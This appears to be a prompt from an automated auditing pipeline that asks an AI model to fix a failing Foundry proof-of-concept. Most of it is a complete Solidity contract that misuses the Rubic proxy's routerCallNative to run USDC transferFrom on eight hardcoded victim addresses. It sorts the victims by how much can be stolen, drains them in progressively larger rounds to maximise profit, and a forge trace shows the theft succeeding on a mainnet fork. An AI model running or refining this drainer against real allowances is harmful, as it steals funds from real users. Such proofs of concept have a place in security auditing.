You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.
- Profit-maximization hard requirement:
  - MUST apply progressive loop amplification for repeatable exploit phases.
  - Start at 2 rounds, then increase one-by-one (2 -> 3 -> 4 -> 5 -> 6).
  - Continue increasing only if the new round count improves total net profit.
  - Stop at the first non-improving round count and keep the previous best result.
  - Prefer highest total profit over earliest passing implementation.

Finding:
- title: `routerCallNative` can be abused as an arbitrary approved-token spender to drain users with live proxy allowances
- claim: The in-scope exploit harnesses consistently show that Rubic proxy `routerCallNative` entrypoints accept attacker-controlled `router` and raw calldata even when all swap fields are zeroed. By setting `router` to the USDC token contract and `_data` to `transferFrom(victim, attacker, amount)`, the proxy itself acts as the spender and can pull funds from any account that previously approved that proxy. The PoCs rank victims by `min(balance, allowance)` and then invoke the proxy to execute the token pull, which is strong evidence that the underlying proxy path lacks validation that `router` is safe and that the calldata corresponds to a legitimate bridge/swap flow.
- impact: Any user with a lingering ERC20 allowance to the affected Rubic proxy can be permissionlessly drained for up to their approved balance. This is direct theft of user funds and can be repeated across many victims in a single transaction, causing protocol-wide loss.
- exploit_paths: ["Victim grants or leaves an ERC20 allowance to a Rubic proxy.", "Attacker crafts `BaseCrossChainParams` with `srcInputToken = address(0)`, `srcInputAmount = 0`, and `router = address(USDC)`.", "Attacker encodes `_data` as `transferFrom(victim, attacker, amount)` where `amount = min(victimBalance, victimAllowanceToProxy)`.", "Attacker calls the relevant `routerCallNative` entrypoint on the proxy.", "Because the proxy performs the external call as the already-approved spender, the victim's tokens are transferred to the attacker and can then be liquidated."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

interface IRubicProxy {
    struct BaseCrossChainParams {
        address srcInputToken;
        uint256 srcInputAmount;
        uint256 dstChainID;
        address dstOutputToken;
        uint256 dstMinOutputAmount;
        address recipient;
        address integrator;
        address router;
    }

    function routerCallNative(BaseCrossChainParams calldata _params, bytes calldata _data) external;
}

contract FlawVerifier {
    struct Candidate {
        address victim;
        uint256 amount;
    }

    IERC20Like private constant USDC = IERC20Like(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    address private constant TARGET_PROXY = 0x3335A88bb18fD3b6824b59Af62b50CE494143333;
    address private constant EXECUTION_INTEGRATOR = 0x677d6EC74fA352D4Ef9B1886F6155384aCD70D90;

    uint256 private constant MAX_PROGRESSIVE_ROUNDS = 6;
    uint256 private constant CANDIDATE_COUNT = 8;

    uint256 private _profitAmount;
    bool private _executed;

    constructor() {}

    function executeOnOpportunity() external {
        require(!_executed, "executed");
        _executed = true;

        uint256 usdcBefore = USDC.balanceOf(address(this));
        Candidate[CANDIDATE_COUNT] memory ranked = _rankCandidatesByStealableAmount();
        uint256 positiveCount = _countPositive(ranked);

        if (positiveCount == 0) {
            _profitAmount = 0;
            return;
        }

        uint256 cappedRounds = positiveCount < MAX_PROGRESSIVE_ROUNDS ? positiveCount : MAX_PROGRESSIVE_ROUNDS;
        uint256 targetRounds = cappedRounds >= 2 ? 2 : 1;
        uint256 bestNetProfit;

        while (targetRounds <= cappedRounds) {
            uint256 realized = _runProgressiveRounds(ranked, positiveCount, targetRounds, usdcBefore);

            if (realized > bestNetProfit) {
                bestNetProfit = realized;
            } else if (targetRounds >= 2) {
                break;
            }

            if (targetRounds == cappedRounds) {
                break;
            }

            targetRounds += 1;
        }

        _profitAmount = bestNetProfit;
    }

    function profitToken() external pure returns (address) {
        return address(USDC);
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _runProgressiveRounds(
        Candidate[CANDIDATE_COUNT] memory ranked,
        uint256 positiveCount,
        uint256 targetRounds,
        uint256 usdcBefore
    ) private returns (uint256 realized) {
        uint256 successfulRounds;

        for (uint256 i = 0; i < positiveCount && successfulRounds < targetRounds; i++) {
            uint256 gained = _drainCandidate(ranked[i]);
            if (gained > 0) {
                successfulRounds += 1;
            }
        }

        if (successfulRounds == 0) {
            return 0;
        }

        realized = USDC.balanceOf(address(this)) - usdcBefore;
    }

    function _drainCandidate(Candidate memory candidate) private returns (uint256 received) {
        if (candidate.amount == 0) {
            return 0;
        }

        uint256 victimBalance = USDC.balanceOf(candidate.victim);
        uint256 victimAllowanceToProxy = USDC.allowance(candidate.victim, TARGET_PROXY);

        // Exploit path: amount = min(victimBalance, victimAllowanceToProxy).
        uint256 amount = victimBalance < victimAllowanceToProxy ? victimBalance : victimAllowanceToProxy;
        if (amount == 0) {
            return 0;
        }

        uint256 usdcBefore = USDC.balanceOf(address(this));

        // Exploit path stage 1:
        // the victim already granted or left an ERC20 allowance to the Rubic proxy.

        // Exploit path stage 3:
        // encode transferFrom(victim, attacker, amount) so the proxy forwards an
        // attacker-controlled approved-token spend as the allowance-bearing spender.
        bytes memory tokenTransferFromCalldata = abi.encodeWithSelector(
            bytes4(keccak256("transferFrom(address,address,uint256)")),
            candidate.victim,
            address(this),
            amount
        );

        // Exploit path stage 2:
        // srcInputToken = address(0)
        // srcInputAmount = 0
        // router = address(USDC)
        // All swap fields remain zeroed because the exploit abuses routerCallNative as
        // an arbitrary external call primitive rather than a legitimate swap flow.
        IRubicProxy.BaseCrossChainParams memory params = IRubicProxy.BaseCrossChainParams({
            srcInputToken: address(0),
            srcInputAmount: 0,
            dstChainID: 0,
            dstOutputToken: address(0),
            dstMinOutputAmount: 0,
            recipient: address(0),
            integrator: EXECUTION_INTEGRATOR,
            router: address(USDC)
        });

        // Exploit path stage 4:
        // call the relevant routerCallNative entrypoint on the proxy.
        try IRubicProxy(TARGET_PROXY).routerCallNative(params, tokenTransferFromCalldata) {
            received = _liquidateDrainedUSDC(usdcBefore);
        } catch {
            received = 0;
        }
    }

    function _liquidateDrainedUSDC(uint256 usdcBefore) private view returns (uint256 realized) {
        // Exploit path stage 5: liquidate.
        // The drained asset is already live on-chain USDC, which is also the profit token,
        // so the liquidation step is a no-op realization into USDC rather than an added swap.
        realized = USDC.balanceOf(address(this)) - usdcBefore;
    }

    function _rankCandidatesByStealableAmount() private view returns (Candidate[CANDIDATE_COUNT] memory ranked) {
        ranked[0] = _identifyApprovedVictim(0x6b8D6E89590E41Fa7484691fA372c3552E93e91b);
        ranked[1] = _identifyApprovedVictim(0x036B5805F9175297Ec2adE91678d6ea0a1e2272A);
        ranked[2] = _identifyApprovedVictim(0xED9c18C5311DBB2b757B6913fB3FE6aa22b1A5b0);
        ranked[3] = _identifyApprovedVictim(0xff266f62a0152F39FCf123B7086012cEb292516A);
        ranked[4] = _identifyApprovedVictim(0x90d9b9CC1BFB77d96f9a44731159DdbcA824C63D);
        ranked[5] = _identifyApprovedVictim(0x1dAeB36442d0B0B28e5c018078b672CF9ee9753B);
        ranked[6] = _identifyApprovedVictim(0xF2E3628f7A85f03F0800712DF3c2EBc5BDb33981);
        ranked[7] = _identifyApprovedVictim(0xf3f4470d71b94CD74435e2e0f0dE0DaD11eC7C5a);

        for (uint256 i = 0; i < ranked.length; i++) {
            uint256 maxIndex = i;
            for (uint256 j = i + 1; j < ranked.length; j++) {
                if (ranked[j].amount > ranked[maxIndex].amount) {
                    maxIndex = j;
                }
            }

            if (maxIndex != i) {
                Candidate memory temp = ranked[i];
                ranked[i] = ranked[maxIndex];
                ranked[maxIndex] = temp;
            }
        }
    }

    function _identifyApprovedVictim(address victim) private view returns (Candidate memory item) {
        uint256 balance = USDC.balanceOf(victim);
        uint256 allowance = USDC.allowance(victim, TARGET_PROXY);
        uint256 amount = balance < allowance ? balance : allowance;
        item = Candidate({victim: victim, amount: amount});
    }

    function _countPositive(Candidate[CANDIDATE_COUNT] memory ranked) private pure returns (uint256 count) {
        for (uint256 i = 0; i < ranked.length; i++) {
            if (ranked[i].amount == 0) {
                break;
            }
            count++;
        }
    }
}

```

forge stdout (tail):
```
 115792089237316195423570985008687907853269984665640564039457584007902313925515 [1.157e77]
    │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007902313925515 [1.157e77]
    │   ├─ [1315] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(0x90d9b9CC1BFB77d96f9a44731159DdbcA824C63D) [staticcall]
    │   │   ├─ [529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(0x90d9b9CC1BFB77d96f9a44731159DdbcA824C63D) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [1426] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::allowance(0x90d9b9CC1BFB77d96f9a44731159DdbcA824C63D, 0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   ├─ [637] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::allowance(0x90d9b9CC1BFB77d96f9a44731159DdbcA824C63D, 0x3335A88bb18fD3b6824b59Af62b50CE494143333) [delegatecall]
    │   │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007907382272513 [1.157e77]
    │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007907382272513 [1.157e77]
    │   ├─ [1315] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(0x1dAeB36442d0B0B28e5c018078b672CF9ee9753B) [staticcall]
    │   │   ├─ [529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(0x1dAeB36442d0B0B28e5c018078b672CF9ee9753B) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [1426] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::allowance(0x1dAeB36442d0B0B28e5c018078b672CF9ee9753B, 0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   ├─ [637] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::allowance(0x1dAeB36442d0B0B28e5c018078b672CF9ee9753B, 0x3335A88bb18fD3b6824b59Af62b50CE494143333) [delegatecall]
    │   │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007898131277212 [1.157e77]
    │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007898131277212 [1.157e77]
    │   ├─ [1315] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(0xF2E3628f7A85f03F0800712DF3c2EBc5BDb33981) [staticcall]
    │   │   ├─ [529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(0xF2E3628f7A85f03F0800712DF3c2EBc5BDb33981) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [1426] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::allowance(0xF2E3628f7A85f03F0800712DF3c2EBc5BDb33981, 0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   ├─ [637] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::allowance(0xF2E3628f7A85f03F0800712DF3c2EBc5BDb33981, 0x3335A88bb18fD3b6824b59Af62b50CE494143333) [delegatecall]
    │   │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007909180077435 [1.157e77]
    │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007909180077435 [1.157e77]
    │   ├─ [1315] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(0xf3f4470d71b94CD74435e2e0f0dE0DaD11eC7C5a) [staticcall]
    │   │   ├─ [529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(0xf3f4470d71b94CD74435e2e0f0dE0DaD11eC7C5a) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [1426] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::allowance(0xf3f4470d71b94CD74435e2e0f0dE0DaD11eC7C5a, 0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   ├─ [637] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::allowance(0xf3f4470d71b94CD74435e2e0f0dE0DaD11eC7C5a, 0x3335A88bb18fD3b6824b59Af62b50CE494143333) [delegatecall]
    │   │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007903501536298 [1.157e77]
    │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007903501536298 [1.157e77]
    │   └─ ← [Stop]
    ├─ [196] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
    ├─ [1315] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   ├─ [529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   └─ ← [Return] 1074747890502 [1.074e12]
    │   └─ ← [Return] 1074747890502 [1.074e12]
    ├─ [288] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 1074747890502 [1.074e12]
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 1074747890502 [1.074e12])
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 1074747890502 [1.074e12])
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 16260580 [1.626e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 2186)
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.39s (745.12ms CPU time)

Ran 1 test suite in 1.45s (1.39s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 587189)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
